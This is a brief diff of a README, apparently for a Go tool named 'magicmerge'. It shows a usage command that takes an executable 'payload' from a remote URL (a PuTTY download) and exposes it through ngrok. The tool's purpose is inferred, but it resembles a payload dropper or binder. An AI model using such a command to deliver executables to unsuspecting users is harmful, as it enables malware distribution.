@@ -82,7 +82,6 @@ go build -o magicmerge.exe .
 ```
 https://go.dev/doc/install
 ```
-
 magicmerge.exe -payload="https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" -url=true -ngrok=true
 ```
 <p>1. Run with local go server and Payload from local storage.</p>
